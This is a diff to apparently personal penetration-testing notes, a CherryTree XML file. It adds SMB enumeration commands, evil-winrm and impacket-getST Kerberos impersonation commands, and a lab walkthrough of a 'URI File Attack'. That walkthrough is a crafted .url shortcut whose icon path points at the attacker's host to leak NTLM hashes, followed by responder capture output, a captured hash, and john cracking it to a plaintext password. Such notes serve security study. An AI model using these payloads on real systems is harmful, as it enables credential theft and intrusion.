@@ -1294,7 +1294,7 @@ _____________________________________
         <codebox char_offset="7" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 10.11.1. | tee output.log</codebox>
         <codebox char_offset="24" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 10.11.1. -port [port number 1], [port number 2], [port number 3]</codebox>
       </node>
-      <node name="smb" unique_id="34" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687626207" ts_lastsave="1689886936">
+      <node name="smb" unique_id="34" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687626207" ts_lastsave="1690064532">
         <rich_text scale="h1">Nmap</rich_text>
         <rich_text>
 
@@ -1311,7 +1311,13 @@ vuln scan:
         <rich_text justification="left"></rich_text>
         <rich_text>
 _____________________________________
+</rich_text>
+        <rich_text scale="h2">Basics</rich_text>
+        <rich_text>
 
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
 
 </rich_text>
         <rich_text scale="h2">SMBClient copying everything to local</rich_text>
@@ -1321,6 +1327,18 @@ _____________________________________
 </rich_text>
         <rich_text justification="left"></rich_text>
         <rich_text>
+
+
+Also check if u can put something in it:
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+once put u can check accesing them and try something like this </rich_text>
+        <rich_text link="node 98">URI File Attack</rich_text>
+        <rich_text>
+
 _________________________________________________
 
 </rich_text>
@@ -1356,6 +1374,7 @@ or
 </rich_text>
         <rich_text justification="left"></rich_text>
         <rich_text>
+
 
 _________________________________________
 
@@ -1397,23 +1416,25 @@ Also check
 </rich_text>
         <codebox char_offset="27" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap --script smb-enum-shares -p 139,445 10.11.1.</codebox>
         <codebox char_offset="42" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap --script=smb-vuln* --script-args=unsafe=1 -T5 10.11.1.</codebox>
-        <codebox char_offset="124" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbclient //10.11.1./directoryName -U &lt;username&gt;
+        <codebox char_offset="90" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbclient -N -L 10.11.1.   </codebox>
+        <codebox char_offset="133" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbclient //10.11.1./directoryName -U &lt;username&gt;
 
 recurse ON
 prompt OFF
 mget *</codebox>
-        <codebox char_offset="185" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 10.11.1.</codebox>
-        <codebox char_offset="209" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 10.11.1. -u &lt;user&gt; -p &lt;pass&gt;</codebox>
-        <codebox char_offset="259" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -r DirectoryName -H 10.11.1.</codebox>
-        <codebox char_offset="323" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -a 10.11.1.</codebox>
-        <codebox char_offset="330" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -u 'guest' -p '' -a 10.11.1.</codebox>
-        <codebox char_offset="436" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cadaver http://10.11.1.</codebox>
-        <codebox char_offset="457" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Username: &lt;username&gt;
+        <codebox char_offset="179" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">put &lt;filename&gt;</codebox>
+        <codebox char_offset="321" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 10.11.1.</codebox>
+        <codebox char_offset="345" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 10.11.1. -u &lt;user&gt; -p &lt;pass&gt;</codebox>
+        <codebox char_offset="395" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -r DirectoryName -H 10.11.1.</codebox>
+        <codebox char_offset="459" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -a 10.11.1.</codebox>
+        <codebox char_offset="466" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -u 'guest' -p '' -a 10.11.1.</codebox>
+        <codebox char_offset="573" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cadaver http://10.11.1.</codebox>
+        <codebox char_offset="594" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Username: &lt;username&gt;
 Password: &lt;password&gt;</codebox>
-        <codebox char_offset="491" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">put &lt;filename&gt;</codebox>
-        <codebox char_offset="516" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">get &lt;filename&gt;</codebox>
+        <codebox char_offset="628" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">put &lt;filename&gt;</codebox>
+        <codebox char_offset="653" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">get &lt;filename&gt;</codebox>
       </node>
-      <node name="Active Directory" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686505" ts_lastsave="1689473294">
+      <node name="Active Directory" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686505" ts_lastsave="1690061701">
         <rich_text>
 
 
@@ -1727,13 +1748,15 @@ Path Owner                  Access&#13;
 ---- -----                  ------&#13;
      BUILTIN\Administrators resourced\ATTACK$ Allow</codebox>
           </node>
-          <node name="impacket-getST" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690043804" ts_lastsave="1690043806">
+          <node name="impacket-getST" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690043804" ts_lastsave="1690043838">
             <rich_text>We now need to get the administrator service ticket. We can do this by using </rich_text>
             <rich_text family="monospace">impacket-getST</rich_text>
             <rich_text> with our privileged machine account.
 &#13;</rich_text>
+            <rich_text justification="left"></rich_text>
             <codebox char_offset="130" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
-└─$ impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.120.181&#13;
+└─$ impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 10.11.1.&#13;
+
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation&#13;
 &#13;
 [*] Getting TGT for user&#13;
@@ -2431,7 +2454,7 @@ Reference:
           <rich_text>
 </rich_text>
         </node>
-        <node name="evilwinrm" unique_id="95" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689286530" ts_lastsave="1690041279">
+        <node name="evilwinrm" unique_id="95" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689286530" ts_lastsave="1690066973">
           <rich_text>
 </rich_text>
           <rich_text justification="left"></rich_text>
@@ -2452,6 +2475,20 @@ ex:
           <rich_text justification="left"></rich_text>
           <rich_text>
 
+
+
+</rich_text>
+          <rich_text scale="h2">Option</rich_text>
+          <rich_text>
+
+
+If u want to run a file on ur local kali linux directly use `-s`  option followed by  `directory location`
+
+
+
+now if u have
+
+
 References:
 1. </rich_text>
           <rich_text link="webs https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/">https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/</rich_text>
@@ -2461,6 +2498,79 @@ References:
           <codebox char_offset="1" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -u '&lt;user&gt;' -p &lt;password&gt; -i 10.11.1.</codebox>
           <codebox char_offset="8" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.11.1. -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f8</codebox>
           <codebox char_offset="79" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&lt;hash not to use&gt;:&lt;hash to actually use&gt;</codebox>
+          <codebox char_offset="201" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.11.1. -u anirudh -p "SecureHM" -s .</codebox>
+        </node>
+        <node name="URI File Attack" unique_id="98" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690061701" ts_lastsave="1690061750">
+          <rich_text>
+</rich_text>
+          <rich_text scale="h2">URI File Attack</rich_text>
+          <rich_text>
+&#13;As this is a Windows host, we can use the SMB share access&#13;  to upload a file that the target system will interpret as a Windows &#13; shortcut. In this file, we can specify an icon that points to our Kali &#13; host. This should allow us to capture the user's NTLM hash when it is &#13; accessed.
+&#13;We'll create a file named @hax.url with the following contents.
+&#13;</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text family="monospace">&#13;
+</rich_text>
+          <rich_text>
+&#13;When a user accesses this file, it will attempt to load &#13; the icon. This will cause a request to our Kali host for a file named &#13; with the user account's username. This request should also contain the &#13; NTLM hash of this account.
+&#13;Before uploading the file to the SMB share, let's start responder to listen for the request.
+&#13;</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text family="monospace">&#13;
+</rich_text>
+          <rich_text>
+&#13;Next, let's upload our file.
+&#13;</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text family="monospace">&#13;
+</rich_text>
+          <rich_text>
+&#13;Nice, we successfully obtained the NTLM hash for a user named anirudh.&#13; User Password Brute-Force
+&#13;Let's save this hash to a file and attempt to crack it using john and the rockyou.txt wordlist.
+&#13;</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text family="monospace">&#13;
+</rich_text>
+          <rich_text>
+</rich_text>
+          <codebox char_offset="370" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
+└─$ cat @hax.url &#13;
+[InternetShortcut]&#13;
+URL=anything&#13;
+WorkingDirectory=anything&#13;
+IconFile=\\192.168.118.14\%USERNAME%.icon&#13;
+IconIndex=1</codebox>
+          <codebox char_offset="700" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
+└─$ sudo responder -I tun0 -v&#13;
+...&#13;
+[+] Listening for events...&#13;
+...</codebox>
+          <codebox char_offset="735" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">...&#13;
+smb: \&gt; put @hax.url &#13;
+putting file @hax.url as \@hax.url (1.2 kb/s) (average 1.2 kb/s)&#13;
+smb: \&gt; quit&#13;
+&#13;
+┌──(kali㉿kali)-[~]&#13;
+└─$&#13;
+
+&#13;After a little while, responder captures a hash.
+&#13;[SMB] NTLMv2-SSP Client   : 192.168.120.116&#13;
+[SMB] NTLMv2-SSP Username : VAULT\anirudh&#13;
+[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:9def1316e1c05550:0AF01C475AFD7AD30D439711296603FC:010100000000000000C8C8F445DDD70175319E0B50E5D26C0000000002000800410031005900380001001E00570049004E002D004C00580033003800430030004B004C00350047005A0004003400570049004E002D004C00580033003800430030004B004C00350047005A002E0041003100590038002E004C004F00430041004C000300140041003100590038002E004C004F00430041004C000500140041003100590038002E004C004F00430041004C000700080000C8C8F445DDD7010600040002000000080030003000000000000000010000000020000024B3687DE76994B1C5B750504A62A0055473E634299355A166AE72D58CD7F8660A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E003100310038002E00310034000000000000000000 </codebox>
+          <codebox char_offset="936" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
+└─$ cat hash.txt &#13;
+anirudh::VAULT:9def1316e1c05550:0AF01C475AFD7AD30D439711296603FC:010100000000000000C8C8F445DDD70175319E0B50E5D26C0000000002000800410031005900380001001E00570049004E002D004C00580033003800430030004B004C00350047005A0004003400570049004E002D004C00580033003800430030004B004C00350047005A002E0041003100590038002E004C004F00430041004C000300140041003100590038002E004C004F00430041004C000500140041003100590038002E004C004F00430041004C000700080000C8C8F445DDD7010600040002000000080030003000000000000000010000000020000024B3687DE76994B1C5B750504A62A0055473E634299355A166AE72D58CD7F8660A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E003100310038002E00310034000000000000000000&#13;
+&#13;
+┌──(kali㉿kali)-[~]&#13;
+└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt&#13;
+Using default input encoding: UTF-8&#13;
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])&#13;
+Will run 4 OpenMP threads&#13;
+Press 'q' or Ctrl-C to abort, almost any other key for status&#13;
+SecureHM         (anirudh)     &#13;
+1g 0:00:00:03 DONE (2021-11-19 13:09) 0.2564g/s 2720Kp/s 2720Kc/s 2720KC/s Seifer@14..Schsutar90&#13;
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably&#13;
+Session completed. </codebox>
         </node>
       </node>
       <node name="nmap" unique_id="36" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686543" ts_lastsave="1687686592">
